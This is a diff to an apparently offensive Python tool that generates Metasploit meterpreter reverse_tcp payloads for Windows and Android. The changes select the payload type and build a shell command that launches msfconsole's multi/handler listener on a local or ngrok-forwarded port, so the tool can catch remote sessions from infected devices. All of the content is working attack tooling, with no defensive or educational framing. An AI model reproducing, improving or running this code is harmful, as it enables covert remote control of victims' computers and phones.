@@ -311,10 +311,12 @@ def setPayload():
         NAME = input(f" \n NAME {Fore.CYAN}>{Style.RESET_ALL} ")
 
         if choice == "1":
+            payload = "windows/meterpreter/reverse_tcp"
             createPayload(modulo=1, LHOST=HOST, LPORT=LPORT, NAME=NAME)
         elif choice == "2":
+            payload = "android/meterpreter/reverse_tcp"
             if lanORwan.lower() == "y":
-                createPayload(modulo=2, LHOST=HOST, LPORT=ngrok_PORT, NAME=NAME)
+                createPayload(modulo=2, LHOST=HOST, LPORT=LPORT, NAME=NAME)
         elif choice == "3":
             module = input(f"\n Module {Fore.CYAN}> {Style.RESET_ALL}")
             FORMAT = input(f"\n FORMAT (ES: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
@@ -333,7 +335,12 @@ def setPayload():
             if lanORwan.lower() == "y":
                 HOST = '0.0.0.0'
             else: pass
-            command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {HOST}; set LPORT {LPORT}; exploit; exec bash\"'"
+            if lanORwan.lower() == "y":
+                command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {payload}; set LHOST {HOST}; set LPORT {ngrok_PORT}; exploit; exec bash\"'"
+            else:
+                command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {payload}; set LHOST {HOST}; set LPORT {LPORT}; exploit; exec bash\"'"  
+          
+           
             subprocess.run(command, shell=True)
             return menu()
         elif msf.lower() == "n":
